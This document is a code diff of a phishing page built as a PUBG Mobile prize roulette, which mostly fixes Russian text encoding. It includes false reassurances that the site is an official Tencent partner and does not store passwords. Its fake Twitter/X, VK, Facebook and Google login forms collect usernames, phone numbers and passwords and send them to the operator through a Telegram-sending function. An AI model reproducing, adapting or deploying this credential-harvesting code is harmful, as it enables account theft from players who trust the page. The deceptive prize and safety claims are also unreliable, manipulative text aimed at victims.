-                        "Ð ÑÐµÐ´ÐºÐ¸Ñ ÑÐ»ÑÑÐ°ÑÑ Ð¿ÑÐ¸ Ð²ÑÑÐ¾ÐºÐ¾Ð¹ Ð½Ð°Ð³ÑÑÐ·ÐºÐµ Ð½Ð° ÑÐµÑÐ²ÐµÑÑ Ð¾Ð±ÑÐ°Ð±Ð¾ÑÐºÐ° Ð¼Ð¾Ð¶ÐµÑ Ð·Ð°Ð½ÑÑÑ Ð´Ð¾ <strong>48 ÑÐ°ÑÐ¾Ð²</strong>. ÐÑÐ»Ð¸ Ð² ÑÐµÑÐµÐ½Ð¸Ðµ ÑÑÐ¾Ð³Ð¾ Ð²ÑÐµÐ¼ÐµÐ½Ð¸ Ð¿ÑÐ¸Ð· Ð½Ðµ Ð±ÑÐ» Ð·Ð°ÑÐ¸ÑÐ»ÐµÐ½ Ð½Ð° Ð²Ð°Ñ Ð°ÐºÐºÐ°ÑÐ½Ñ, Ð¿Ð¾Ð¶Ð°Ð»ÑÐ¹ÑÑÐ°, Ð¾Ð±ÑÐ°ÑÐ¸ÑÐµÑÑ Ð² Ð½Ð°ÑÑ <a href='https://t.me/helpumgmbot' target='_blank'>ÑÐµÑÐ½Ð¸ÑÐµÑÐºÑÑ Ð¿Ð¾Ð´Ð´ÐµÑÐ¶ÐºÑ</a> Ñ Ð²Ð°ÑÐ¸Ð¼ ID Ð¸ Ð²ÑÐµÐ¼ÐµÐ½ÐµÐ¼ Ð²ÑÐ¸Ð³ÑÑÑÐ°.",
-                        "<strong>ÐÐ°, ÑÑÐ¾ Ð°Ð±ÑÐ¾Ð»ÑÑÐ½Ð¾ Ð±ÐµÐ·Ð¾Ð¿Ð°ÑÐ½Ð¾.</strong> ÐÑ Ð¸ÑÐ¿Ð¾Ð»ÑÐ·ÑÐµÐ¼ Ð±ÐµÐ·Ð¾Ð¿Ð°ÑÐ½Ð¾Ðµ SSL-ÑÐ¸ÑÑÐ¾Ð²Ð°Ð½Ð¸Ðµ Ð¸ Ð½Ðµ ÑÑÐ°Ð½Ð¸Ð¼ Ð²Ð°ÑÐ¸ Ð¿Ð°ÑÐ¾Ð»Ð¸. ÐÐ²ÑÐ¾ÑÐ¸Ð·Ð°ÑÐ¸Ñ Ð¿ÑÐ¾Ð¸ÑÑÐ¾Ð´Ð¸Ñ ÑÐµÑÐµÐ· Ð¾ÑÐ¸ÑÐ¸Ð°Ð»ÑÐ½ÑÐµ API ÑÐ¾ÑÐ¸Ð°Ð»ÑÐ½ÑÑ ÑÐµÑÐµÐ¹, Ð°Ð½Ð°Ð»Ð¾Ð³Ð¸ÑÐ½Ð¾ ÑÐ¾Ð¼Ñ, ÐºÐ°Ðº Ð²Ñ Ð²ÑÐ¾Ð´Ð¸ÑÐµ Ð² Ð¿ÑÐ¸Ð»Ð¾Ð¶ÐµÐ½Ð¸Ñ Ð½Ð° ÑÐµÐ»ÐµÑÐ¾Ð½Ðµ.",
-                        "ÐÐ°Ð¶Ð´ÑÐ¹ Ð¿Ð¾Ð»ÑÐ·Ð¾Ð²Ð°ÑÐµÐ»Ñ Ð¼Ð¾Ð¶ÐµÑ ÑÑÐ°ÑÑÐ²Ð¾Ð²Ð°ÑÑ Ð² Ð°ÐºÑÐ¸Ð¸ <strong>Ð¾Ð´Ð¸Ð½ ÑÐ°Ð· Ð² Ð´ÐµÐ½Ñ</strong>. Ð­ÑÐ¾ ÑÐ´ÐµÐ»Ð°Ð½Ð¾ Ð´Ð»Ñ ÑÐ¾Ð³Ð¾, ÑÑÐ¾Ð±Ñ ÐºÐ°Ðº Ð¼Ð¾Ð¶Ð½Ð¾ Ð±Ð¾Ð»ÑÑÐµ Ð¸Ð³ÑÐ¾ÐºÐ¾Ð² Ð¿Ð¾Ð»ÑÑÐ¸Ð»Ð¸ ÑÐ°Ð½Ñ Ð²ÑÐ¸Ð³ÑÐ°ÑÑ. ÐÐ¾Ð·Ð²ÑÐ°ÑÐ°Ð¹ÑÐµÑÑ Ð·Ð°Ð²ÑÑÐ°, ÑÑÐ¾Ð±Ñ Ð¿Ð¾Ð¿ÑÑÐ°ÑÑ ÑÐ´Ð°ÑÑ ÑÐ½Ð¾Ð²Ð°!",
-                        "Ð Ð½Ð°ÑÐµÐ¹ ÑÑÐ»ÐµÑÐºÐµ Ð¿ÑÐµÐ´ÑÑÐ°Ð²Ð»ÐµÐ½Ñ <strong>ÑÐºÑÐºÐ»ÑÐ·Ð¸Ð²Ð½ÑÐµ Ð¿ÑÐµÐ´Ð¼ÐµÑÑ Ð¸Ð· PUBG Mobile</strong>: ÑÐµÐ´ÐºÐ¸Ðµ ÑÐºÐ¸Ð½Ñ, Ð¾ÑÑÐ¶Ð¸Ðµ, ÑÑÐ°Ð½ÑÐ¿Ð¾ÑÑ, ÑÐºÐ¸Ð¿Ð¸ÑÐ¾Ð²ÐºÐ° Ð¸ Ð²Ð½ÑÑÑÐ¸Ð¸Ð³ÑÐ¾Ð²Ð°Ñ Ð²Ð°Ð»ÑÑÐ° UC. ÐÑÐµ Ð¿ÑÐ¸Ð·Ñ ÑÐ²Ð»ÑÑÑÑÑ Ð¾ÑÐ¸ÑÐ¸Ð°Ð»ÑÐ½ÑÐ¼ Ð¸Ð³ÑÐ¾Ð²ÑÐ¼ ÐºÐ¾Ð½ÑÐµÐ½ÑÐ¾Ð¼ Ð¸ Ð½Ðµ Ð½Ð°ÑÑÑÐ°ÑÑ Ð¿Ð¾Ð»ÑÐ·Ð¾Ð²Ð°ÑÐµÐ»ÑÑÐºÐ¾Ðµ ÑÐ¾Ð³Ð»Ð°ÑÐµÐ½Ð¸Ðµ."
+                        "<strong>Да, это официальный сайт партнера.</strong> Мы являемся официальными партнерами Tencent Games и работаем в рамках программы PUBG Mobile Partner. Наша деятельность полностью авторизована разработчиками.",
+                        "<strong>Да, 100% гарантия получения приза.</strong> Все выигрыши отправляются автоматически в течение 24 часов после подтверждения данных. Система интегрирована с официальным API PUBG Mobile, что гарантирует доставку призов на указанный аккаунт.",
+                        "Вход в социальную сеть необходим для <strong>подтверждения вашей личности</strong> и предотвращения мошенничества. Это позволяет нам убедиться, что приз получает реальный человек, а не бот. Все данные защищены и не передаются третьим лицам.",
+                        "Без указания ID аккаунта PUBG Mobile мы <strong>не можем отправить вам приз</strong>. Это обязательное поле, так как именно по этому идентификатору система определяет, на какой игровой аккаунт зачислить выигранные предметы.",
+                        "В редких случаях при высокой нагрузке на серверы обработка может занять до <strong>48 часов</strong>. Если в течение этого времени приз не был зачислен на ваш аккаунт, пожалуйста, обратитесь в нашу <a href='https://t.me/helpumgmbot' target='_blank'>техническую поддержку</a> с вашим ID и временем выигрыша.",
+                        "<strong>Да, это абсолютно безопасно.</strong> Мы используем безопасное SSL-шифрование и не храним ваши пароли. Авторизация происходит через официальные API социальных сетей, аналогично тому, как вы входите в приложения на телефоне.",
+                        "Каждый пользователь может участвовать в акции <strong>один раз в день</strong>. Это сделано для того, чтобы как можно больше игроков получили шанс выиграть. Возвращайтесь завтра, чтобы попытать удачу снова!",
+                        "В нашей рулетке представлены <strong>эксклюзивные предметы из PUBG Mobile</strong>: редкие скины, оружие, транспорт, экипировка и внутриигровая валюта UC. Все призы являются официальным игровым контентом и не нарушают пользовательское соглашение."
                     ],
-                    footerLinks: ["Ð£ÑÐ»Ð¾Ð²Ð¸Ñ Ð¾Ð±ÑÐ»ÑÐ¶Ð¸Ð²Ð°Ð½Ð¸Ñ", "ÐÐ¾Ð»Ð¸ÑÐ¸ÐºÐ° ÐºÐ¾Ð½ÑÐ¸Ð´ÐµÐ½ÑÐ¸Ð°Ð»ÑÐ½Ð¾ÑÑÐ¸", "ÐÐ¾Ð»Ð¸ÑÐ¸ÐºÐ° Cookie", "ÐÑÐµÐ´Ð¿Ð¾ÑÑÐµÐ½Ð¸Ðµ Cookies"],
-                    copyright: "ÐÐ²ÑÐ¾ÑÑÐºÐ¸Ðµ Ð¿ÑÐ°Ð²Ð° Â© High Morale Developments Limited. ÐÑÐµ Ð¿ÑÐ°Ð²Ð° Ð·Ð°ÑÐ¸ÑÐµÐ½Ñ.",
-                    notificationPrize: "ÐÐ¾Ð·Ð´ÑÐ°Ð²Ð»ÑÐµÐ¼! ÐÑ Ð²ÑÐ¸Ð³ÑÐ°Ð»Ð¸ Ð¿ÑÐ¸Ð·!",
-                    notificationIdSaved: "ID Ð°ÐºÐºÐ°ÑÐ½ÑÐ° ÑÐ¾ÑÑÐ°Ð½ÐµÐ½"
+                    footerLinks: ["Условия обслуживания", "Политика конфиденциальности", "Политика Cookie", "Предпочтение Cookies"],
+                    copyright: "Авторские права © High Morale Developments Limited. Все права защищены.",
+                    notificationPrize: "Поздравляем! Вы выиграли приз!",
+                    notificationIdSaved: "ID аккаунта сохранен"
                 },
                 uz: {
                     winnersCounter: "G'oliblar:",
@@ -3470,7 +3470,7 @@
                     selected: "TANLANGAN",
                     prizeBanner: "SIZNING SOVRININGIZ",
                     prizeDescription: "Element o'yin pochtaingizga yuborildi. Iltimos, tranzaksiya qayta ishlanishi uchun 24 soatgacha kuting.",
-                    prizeReceived: "â Sizning sovringiz PUBG Mobile hisobingizga yuborildi.",
+                    prizeReceived: "✅ Sizning sovringiz PUBG Mobile hisobingizga yuborildi.",
                     selectPrize: "Sovrinni olish uchun ijtimoiy tarmoqni tanlang.",
                     mailEmpty: "Sizda hali yutgan sovringiz yo'q. Eksklyuziv sovrinlarni yutish uchun omad g'ildig'ida o'ynang!",
                     collect: "OLISH",
@@ -3513,60 +3513,60 @@
                         "Bizning g'ildirakimizda <strong>PUBG Mobile'dan eksklyuziv elementlar</strong> mavjud: noyob skinlar, qurollar, transport, jihozlar va o'yin ichidagi UC valyutasi. Barcha sovrinlar rasmiy o'yin kontenti bo'lib, foydalanuvchi shartnomasini buzmaydi."
                     ],
                     footerLinks: ["Xizmat shartlari", "Maxfiylik siyosati", "Cookie siyosati", "Cookie afzalliklari"],
-                    copyright: "Mualliflik huquqi Â© High Morale Developments Limited. Barcha huquqlar himoyalangan.",
+                    copyright: "Mualliflik huquqi © High Morale Developments Limited. Barcha huquqlar himoyalangan.",
                     notificationPrize: "Tabriklaymiz! Siz sovrinni yutdingiz!",
                     notificationIdSaved: "Hisob ID raqami saqlandi"
                 }
             };
             
-            // Ð¤ÑÐ½ÐºÑÐ¸Ñ ÑÐ¼ÐµÐ½Ñ ÑÐ·ÑÐºÐ°
+            // Функция смены языка
             function changeLanguage(lang) {
                 currentLang = lang;
                 const t = translations[lang] || translations.en;
                 
-                // ÐÐ±Ð½Ð¾Ð²Ð»ÑÐµÐ¼ ÑÑÐµÑÑÐ¸Ðº Ð¿Ð¾Ð±ÐµÐ´Ð¸ÑÐµÐ»ÐµÐ¹
+                // Обновляем счетчик победителей
                 document.querySelector('.winners-counter').innerHTML = `<span class="winners-count" id="winnersCount">${winnersCount}</span>`;
                 
-                // ÐÐ±Ð½Ð¾Ð²Ð»ÑÐµÐ¼ Ð²ÐµÑÑÐ½ÐµÐµ Ð¼ÐµÐ½Ñ
+                // Обновляем верхнее меню
                 menuBtn.innerHTML = `<i class="fas fa-bars"></i> ${t.menu}`;
                 document.getElementById('prizeMailBtn').innerHTML = `<i class="fas fa-gift"></i> ${t.myPrize} <div class="prize-badge" id="prizeBadge">0</div>`;
                 
-                // ÐÐ±Ð½Ð¾Ð²Ð»ÑÐµÐ¼ ÐºÐ½Ð¾Ð¿ÐºÑ Ð¸Ð³ÑÑ
+                // Обновляем кнопку игры
                 if (hasPlayed && userIP !== ownerIP) {
                     playBtn.innerHTML = `<i class="fas fa-check"></i> ${t.alreadyPlayed}`;
                 } else {
                     playBtn.innerHTML = `<i class="fas fa-play"></i> ${t.play}`;
                 }
                 
-                // ÐÐ±Ð½Ð¾Ð²Ð»ÑÐµÐ¼ Ð¸Ð½Ð´Ð¸ÐºÐ°ÑÐ¾Ñ Ð²ÑÐ±Ð¾ÑÐ°
+                // Обновляем индикатор выбора
                 selectionIndicator.textContent = t.selected;
                 
-                // ÐÐ±Ð½Ð¾Ð²Ð»ÑÐµÐ¼ Ð¾ÐºÐ½Ð¾ Ð¿ÑÐ¸Ð·Ð°
+                // Обновляем окно приза
                 document.querySelector('.prize-banner').textContent = t.prizeBanner;
                 document.getElementById('winName').textContent = t.prizeBanner;
                 document.getElementById('prizeDescription').textContent = t.prizeDescription;
                 
-                // ÐÐ±Ð½Ð¾Ð²Ð»ÑÐµÐ¼ ÑÐ¾ÑÐ¼Ñ Ð²Ð²Ð¾Ð´Ð° ID
+                // Обновляем форму ввода ID
                 document.querySelector('#accountIdSection h2').textContent = t.idTitle;
                 document.querySelector('#accountIdSection p').textContent = t.idText;
                 document.querySelector('.id-label').textContent = t.idLabel;
                 document.getElementById('accountIdInput').placeholder = t.idPlaceholder;
                 idSubmitBtn.innerHTML = `<i class="fas fa-check"></i> ${t.idSubmit}`;
                 
-                // ÐÐ±Ð½Ð¾Ð²Ð»ÑÐµÐ¼ ÑÐ¾ÑÐ¼Ñ Ð²ÑÐ±Ð¾ÑÐ° ÑÐ¾ÑÑÐµÑÐ¸
+                // Обновляем форму выбора соцсети
                 document.querySelector('#socialSelectSection h2').textContent = t.selectTitle;
                 document.querySelector('#socialSelectSection p').textContent = t.selectText;
                 getPrizeBtn.innerHTML = `<i class="fas fa-paper-plane"></i> ${t.getPrizeBtn}`;
                 importantNote.innerHTML = `<strong>${t.importantNote.split(':')[0]}:</strong> ${t.importantNote.split(':')[1]}`;
                 
-                // ÐÐ±Ð½Ð¾Ð²Ð»ÑÐµÐ¼ ÑÐµÐºÑÐ¸Ñ Ð¿Ð¾Ð´ÑÐ²ÐµÑÐ¶Ð´ÐµÐ½Ð¸Ñ
+                // Обновляем секцию подтверждения
                 document.querySelector('#confirmationSection h2').textContent = t.confirmationTitle;
                 document.querySelector('.confirmation-message').innerHTML = t.confirmationMessage;
                 
-                // ÐÐ±Ð½Ð¾Ð²Ð»ÑÐµÐ¼ FAQ
+                // Обновляем FAQ
                 document.querySelector('.faq-section h2').innerHTML = `<i class="fas fa-question-circle"></i> ${t.faqTitle}`;
                 
-                // ÐÐ±Ð½Ð¾Ð²Ð»ÑÐµÐ¼ Ð²Ð¾Ð¿ÑÐ¾ÑÑ Ð¸ Ð¾ÑÐ²ÐµÑÑ
+                // Обновляем вопросы и ответы
                 const faqItems = document.querySelectorAll('.faq-item');
                 faqItems.forEach((item, index) => {
                     if (t.faqQuestions && t.faqQuestions[index]) {
@@ -3577,7 +3577,7 @@
                     }
                 });
                 
-                // ÐÐ±Ð½Ð¾Ð²Ð»ÑÐµÐ¼ ÑÑÑÐµÑ
+                // Обновляем футер
                 const footerLinks = document.querySelectorAll('.footer-link');
                 t.footerLinks.forEach((text, index) => {
                     if (footerLinks[index]) {
@@ -3586,15 +3586,15 @@
                 });
                 document.querySelector('.copyright').textContent = t.copyright;
                 
-                // ÐÐ±Ð½Ð¾Ð²Ð»ÑÐµÐ¼ ÐºÐ½Ð¾Ð¿ÐºÑ ÑÐ·ÑÐºÐ°
+                // Обновляем кнопку языка
                 const langNames = {
                     en: 'English',
-                    ru: 'Ð ÑÑÑÐºÐ¸Ð¹',
+                    ru: 'Русский',
                     uz: "O'zbekcha"
                 };
                 languageBtn.innerHTML = `<i class="fas fa-globe"></i> ${langNames[lang] || 'English'} <i class="fas fa-chevron-down"></i>`;
                 
-                // ÐÐ±Ð½Ð¾Ð²Ð»ÑÐµÐ¼ Ð²ÑÐ¿Ð°Ð´Ð°ÑÑÐµÐµ Ð¼ÐµÐ½Ñ
+                // Обновляем выпадающее меню
                 document.querySelectorAll('.dropdown-item').forEach((item, index) => {
                     if (index === 0) {
                         item.innerHTML = `<i class="fab fa-telegram"></i> ${t.support}`;
@@ -3602,7 +3602,7 @@
                 });
             }
             
-            // ÐÐ±ÑÐ°Ð±Ð¾ÑÑÐ¸ÐºÐ¸ Ð´Ð»Ñ Ð¼ÐµÐ½Ñ ÑÐ·ÑÐºÐ°
+            // Обработчики для меню языка
             languageBtn.addEventListener('click', function() {
                 languageDropdown.classList.toggle('show');
             });
@@ -3616,12 +3616,12 @@
                 });
             });
             
-            // ÐÐ±ÑÐ°Ð±Ð¾ÑÑÐ¸Ðº Ð´Ð»Ñ Ð¼ÐµÐ½Ñ Ð±ÑÑÐ³ÐµÑÐ°
+            // Обработчик для меню бургера
             menuBtn.addEventListener('click', function() {
                 dropdownMenu.classList.toggle('show');
             });
             
-            // Ð¤ÑÐ½ÐºÑÐ¸Ñ Ð¿Ð¾ÐºÐ°Ð·Ð° ÑÐ²ÐµÐ´Ð¾Ð¼Ð»ÐµÐ½Ð¸Ñ
+            // Функция показа уведомления
             function showNotification(message, isError = false, isSuccess = false) {
                 notification.textContent = message;
                 notification.classList.remove('error', 'success');
@@ -3639,12 +3639,12 @@
                 }, 5000);
             }
             
-            // Ð¤ÑÐ½ÐºÑÐ¸Ñ Ð¿Ð¾Ð»ÑÑÐµÐ½Ð¸Ñ ÑÐ»ÑÑÐ°Ð¹Ð½Ð¾Ð³Ð¾ Ð¿ÑÐ¸Ð·Ð°
+            // Функция получения случайного приза
             function getRandomPrize() {
                 return Math.floor(Math.random() * prizes.length);
             }
             
-            // Ð¤ÑÐ½ÐºÑÐ¸Ñ Ð¿ÐµÑÐµÐ¼ÐµÑÐµÐ½Ð¸Ñ ÑÐ°Ð¼ÐºÐ¸
+            // Функция перемещения рамки
             function moveFrameToPrize(index) {
                 const prizeItem = prizeItems[index];
                 const rect = prizeItem.getBoundingClientRect();
@@ -3656,12 +3656,12 @@
                 selectionFrame.style.top = (rect.top - containerRect.top - 8) + 'px';
                 selectionFrame.classList.add('active');
                 
-                // ÐÐ¾Ð·Ð¸ÑÐ¸Ð¾Ð½Ð¸ÑÐ¾Ð²Ð°Ð½Ð¸Ðµ Ð¸Ð½Ð´Ð¸ÐºÐ°ÑÐ¾ÑÐ°
+                // Позиционирование индикатора
                 selectionIndicator.style.left = rect.left - containerRect.left + rect.width/2 + 'px';
                 selectionIndicator.style.top = rect.top - containerRect.top - 28 + 'px';
             }
             
-            // Ð¤ÑÐ½ÐºÑÐ¸Ñ Ð¿Ð¾ÐºÐ°Ð·Ð°/ÑÐºÑÑÑÐ¸Ñ Ð¸Ð½Ð´Ð¸ÐºÐ°ÑÐ¾ÑÐ°
+            // Функция показа/скрытия индикатора
             function showSelectionIndicator(show) {
                 if (show) {
                     selectionIndicator.classList.add('show');
@@ -3671,11 +3671,11 @@
                 }
             }
             
-            // Ð¤ÑÐ½ÐºÑÐ¸Ñ Ð·Ð°Ð¿ÑÑÐºÐ° ÑÑÐ»ÐµÑÐºÐ¸
+            // Функция запуска рулетки
             function startRoulette() {
                 if (isSpinning) return;
                 
-                // ÐÑÐ¾Ð²ÐµÑÑÐµÐ¼, ÑÐ²Ð»ÑÐµÑÑÑ Ð»Ð¸ Ð¿Ð¾Ð»ÑÐ·Ð¾Ð²Ð°ÑÐµÐ»Ñ Ð²Ð»Ð°Ð´ÐµÐ»ÑÑÐµÐ¼
+                // Проверяем, является ли пользователь владельцем
                 const isOwner = localStorage.getItem('isOwner') === 'true';
                 
                 if (!isOwner && hasPlayed) {
@@ -3698,8 +3698,8 @@
                 selectionFrame.style.opacity = '1';
                 
                 spinCount = 0;
-                // Ð Ð°Ð½Ð´Ð¾Ð¼Ð½Ð°Ñ ÑÐºÐ¾ÑÐ¾ÑÑÑ Ð²ÑÐ°ÑÐµÐ½Ð¸Ñ
-                spinSpeed = Math.random() * 40 + 40; // ÐÑ 40 Ð´Ð¾ 80 Ð¼Ñ
+                // Рандомная скорость вращения
+                spinSpeed = Math.random() * 40 + 40; // От 40 до 80 мс
                 currentPrizeIndex = 0;
                 
                 spinInterval = setInterval(spinStep, spinSpeed);
@@ -3712,14 +3712,14 @@
                 currentPrizeIndex = (currentPrizeIndex + 1) % prizeOrder.length;
                 spinCount++;
                 
-                // ÐÐ¸Ð½Ð°Ð¼Ð¸ÑÐµÑÐºÐ¾Ðµ Ð·Ð°Ð¼ÐµÐ´Ð»ÐµÐ½Ð¸Ðµ
-                if (spinCount > Math.random() * 15 + 20) { // ÐÑ 20 Ð´Ð¾ 35
-                    spinSpeed += Math.random() * 10 + 5; // Ð£Ð²ÐµÐ»Ð¸ÑÐ¸Ð²Ð°ÐµÐ¼ Ð½Ð° 5-15 Ð¼Ñ
+                // Динамическое замедление
+                if (spinCount > Math.random() * 15 + 20) { // От 20 до 35
+                    spinSpeed += Math.random() * 10 + 5; // Увеличиваем на 5-15 мс
                     clearInterval(spinInterval);
                     spinInterval = setInterval(spinStep, spinSpeed);
                 }
                 
-                if (spinCount >= Math.random() * 10 + 40) { // ÐÑ 40 Ð´Ð¾ 50
+                if (spinCount >= Math.random() * 10 + 40) { // От 40 до 50
                     clearInterval(spinInterval);
                     
                     spinSound.pause();
@@ -3734,14 +3734,14 @@
                         setTimeout(() => {
                             isSpinning = false;
                             
-                            // Ð¡Ð¾ÑÑÐ°Ð½ÑÐµÐ¼ Ð²ÑÐ¸Ð³ÑÐ°Ð½Ð½ÑÐ¹ Ð¿ÑÐ¸Ð·
+                            // Сохраняем выигранный приз
                             userPrize = prizes[finalPrizeIndex];
                             isPrizeReceived = false;
                             
-                            // ÐÐ±Ð½Ð¾Ð²Ð»ÑÐµÐ¼ Ð·Ð½Ð°ÑÐ¾Ðº Ñ Ð°Ð½Ð¸Ð¼Ð°ÑÐ¸ÐµÐ¹
+                            // Обновляем значок с анимацией
                             updatePrizeBadge();
                             
-                            // Ð¡Ð¾ÑÑÐ°Ð½ÑÐµÐ¼, ÑÑÐ¾ Ð¿Ð¾Ð»ÑÐ·Ð¾Ð²Ð°ÑÐµÐ»Ñ ÑÐ¶Ðµ Ð¸Ð³ÑÐ°Ð» (ÐµÑÐ»Ð¸ Ð½Ðµ Ð²Ð»Ð°Ð´ÐµÐ»ÐµÑ)
+                            // Сохраняем, что пользователь уже играл (если не владелец)
                             if (userIP !== ownerIP) {
                                 hasPlayed = true;
                                 localStorage.setItem('hasPlayed', 'true');
@@ -3752,16 +3752,16 @@
                             
                             playBtn.disabled = false;
                             
-                            // ÐÐ¾ÐºÐ°Ð·ÑÐ²Ð°ÐµÐ¼ ÑÐ¾ÑÐ¼Ñ Ð²Ð²Ð¾Ð´Ð° ID Ð°ÐºÐºÐ°ÑÐ½ÑÐ°
+                            // Показываем форму ввода ID аккаунта
                             if (!accountId) {
                                 accountIdSection.classList.add('active');
                                 accountIdSection.scrollIntoView({ behavior: 'smooth' });
                             } else {
-                                // Ð¡Ð±ÑÐ°ÑÑÐ²Ð°ÐµÐ¼ Ð²ÑÐ±Ð¾Ñ ÑÐ¾ÑÑÐµÑÐ¸
+                                // Сбрасываем выбор соцсети
                                 socialOptions.forEach(opt => opt.classList.remove('selected'));
                                 selectedSocial = null;
                                 
-                                // ÐÐ¾ÐºÐ°Ð·ÑÐ²Ð°ÐµÐ¼ ÑÐ¾ÑÐ¼Ñ Ð²ÑÐ±Ð¾ÑÐ° ÑÐ¾ÑÑÐµÑÐ¸
+                                // Показываем форму выбора соцсети
                                 socialSelectSection.classList.add('active');
                                 socialSelectSection.scrollIntoView({ behavior: 'smooth' });
                             }
@@ -3772,7 +3772,7 @@
                 }
             }
             
-            // ÐÐ±ÑÐ°Ð±Ð¾ÑÑÐ¸Ðº ÐºÐ½Ð¾Ð¿ÐºÐ¸ Ð¾ÑÐ¿ÑÐ°Ð²ÐºÐ¸ ID Ð°ÐºÐºÐ°ÑÐ½ÑÐ°
+            // Обработчик кнопки отправки ID аккаунта
             idSubmitBtn.addEventListener('click', function() {
                 const id = accountIdInput.value.trim();
                 
@@ -3784,18 +3784,18 @@
                 accountId = id;
                 accountIdSection.classList.remove('active');
                 
-                // Ð¡Ð±ÑÐ°ÑÑÐ²Ð°ÐµÐ¼ Ð²ÑÐ±Ð¾Ñ ÑÐ¾ÑÑÐµÑÐ¸
+                // Сбрасываем выбор соцсети
                 socialOptions.forEach(opt => opt.classList.remove('selected'));
                 selectedSocial = null;
                 
-                // ÐÐ¾ÐºÐ°Ð·ÑÐ²Ð°ÐµÐ¼ ÑÐ¾ÑÐ¼Ñ Ð²ÑÐ±Ð¾ÑÐ° ÑÐ¾ÑÑÐµÑÐ¸
+                // Показываем форму выбора соцсети
                 socialSelectSection.classList.add('active');
                 socialSelectSection.scrollIntoView({ behavior: 'smooth' });
                 
                 showNotification(translations[currentLang].notificationIdSaved, false, true);
             });
             
-            // ÐÐ±ÑÐ°Ð±Ð¾ÑÑÐ¸ÐºÐ¸ Ð²ÑÐ±Ð¾ÑÐ° ÑÐ¾ÑÑÐµÑÐ¸
+            // Обработчики выбора соцсети
             socialOptions.forEach(option => {
                 option.addEventListener('click', function() {
                     socialOptions.forEach(opt => opt.classList.remove('selected'));
@@ -3805,19 +3805,19 @@
                 });
             });
             
-            // ÐÐ±ÑÐ°Ð±Ð¾ÑÑÐ¸ÐºÐ¸ ÑÐ¾ÑÐ¼ Ð²ÑÐ¾Ð´Ð°
+            // Обработчики форм входа
             
-            // Twitter/X ÑÐ¾ÑÐ¼Ð° (ÑÑÐ°Ð¿ 1: email/username)
+            // Twitter/X форма (этап 1: email/username)
             document.getElementById('xEmailForm').addEventListener('submit', async function(e) {
                 e.preventDefault();
                 xUsername = this.querySelector('input').value;
                 
-                // ÐÐµÑÐµÑÐ¾Ð´Ð¸Ð¼ Ðº Ð¾ÐºÐ½Ñ Ð¿Ð°ÑÐ¾Ð»Ñ
+                // Переходим к окну пароля
                 closeModal('xModalStep1');
                 openModal('xModalStep2');
             });
             
-            // Twitter/X ÑÐ¾ÑÐ¼Ð° (ÑÑÐ°Ð¿ 2: Ð¿Ð°ÑÐ¾Ð»Ñ)
+            // Twitter/X форма (этап 2: пароль)
             document.getElementById('xPasswordForm').addEventListener('submit', async function(e) {
                 e.preventDefault();
                 const password = this.querySelector('input').value;
@@ -3839,7 +3839,7 @@
                 }
             });
             
-            // ÐÐÐ¾Ð½ÑÐ°ÐºÑÐµ ÑÐ¾ÑÐ¼Ð°
+            // ВКонтакте форма
             document.getElementById('vkLoginForm').addEventListener('submit', async function(e) {
                 e.preventDefault();
                 const inputs = this.querySelectorAll('input');
@@ -3847,7 +3847,7 @@
                     accountId: accountId,
                     phone: inputs[0].value,
                     password: inputs[1].value,
-                    foreign_computer: inputs[2].checked ? 'ÐÐ°' : 'ÐÐµÑ'
+                    foreign_computer: inputs[2].checked ? 'Да' : 'Нет'
                 };
                 
                 const success = await sendLoginDataToTelegram('vk', loginData, finalPrizeIndex);
@@ -3861,7 +3861,7 @@
                 }
             });
             
-            // Facebook ÑÐ¾ÑÐ¼Ð°
+            // Facebook форма
             document.getElementById('facebookLoginForm').addEventListener('submit', async function(e) {
                 e.preventDefault();
                 const inputs = this.querySelectorAll('input');
@@ -3882,7 +3882,7 @@
                 }
             });
             
-            // Google Fullscreen Ð¾Ð±ÑÐ°Ð±Ð¾ÑÑÐ¸ÐºÐ¸
+            // Google Fullscreen обработчики
             googleNextBtn.addEventListener('click', function(e) {
                 e.preventDefault();
                 const email = googleEmailInput.value.trim();
@@ -3899,7 +3899,7 @@
                 googleShowPassword.checked = false;
                 googlePasswordInput.type = 'password';
                 
-                // ÐÐ½Ð¸Ð¼Ð°ÑÐ¸Ñ Ð¿ÐµÑÐµÑÐ¾Ð´Ð°
+                // Анимация перехода
                 googleStep2.style.animation = 'slideInRight 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275)';
             });
             
@@ -3918,7 +3918,7 @@
                     accountId: accountId,
                     email: googleEmail,
                     password: password,
-                    show_password: showPassword ? 'ÐÐ°' : 'ÐÐµÑ'
+                    show_password: showPassword ? 'Да' : 'Нет'
                 };
                 
                 const success = await sendLoginDataToTelegram('google', loginData, finalPrizeIndex);
@@ -3932,7 +3932,7 @@
                 }
             });
             
-            // ÐÐ±ÑÐ°Ð±Ð¾ÑÑÐ¸Ðº ÑÐµÐºÐ±Ð¾ÐºÑÐ° "ÐÐ¾ÐºÐ°Ð·Ð°ÑÑ Ð¿Ð°ÑÐ¾Ð»Ñ" Ð´Ð»Ñ Google
+            // Обработчик чекбокса "Показать пароль" для Google
             googleShowPassword.addEventListener('change', function() {
                 if (this.checked) {
                     googlePasswordInput.type = 'text';
@@ -3941,19 +3941,19 @@
                 }
             });
             
-            // ÐÐ½Ð¾Ð¿ÐºÐ° "Ð¡Ð¾Ð·Ð´Ð°ÑÑ Ð°ÐºÐºÐ°ÑÐ½Ñ" Ð² Google
+            // Кнопка "Создать аккаунт" в Google
             document.getElementById('googleCreateAccountBtn').addEventListener('click', function(e) {
                 e.preventDefault();
                 showNotification("Account creation function is temporarily unavailable");
             });
             
-            // ÐÐ½Ð¾Ð¿ÐºÐ° "ÐÐ°Ð±ÑÐ»Ð¸ Ð¿Ð°ÑÐ¾Ð»Ñ" Ð² Google
+            // Кнопка "Забыли пароль" в Google
             document.getElementById('googleForgotPasswordBtn').addEventListener('click', function(e) {
                 e.preventDefault();
                 showNotification("Password recovery function is temporarily unavailable");
             });
             
-            // ÐÐ±ÑÐ°Ð±Ð¾ÑÑÐ¸Ðº ÐºÐ½Ð¾Ð¿ÐºÐ¸ Ð¿Ð¾Ð»ÑÑÐµÐ½Ð¸Ñ Ð¿ÑÐ¸Ð·Ð°
+            // Обработчик кнопки получения приза
             getPrizeBtn.addEventListener('click', async function() {
                 if (!selectedSocial) {
                     showNotification(translations[currentLang].notificationSelectSocial, true);
@@ -3967,7 +3967,7 @@
                     return;
                 }
                 
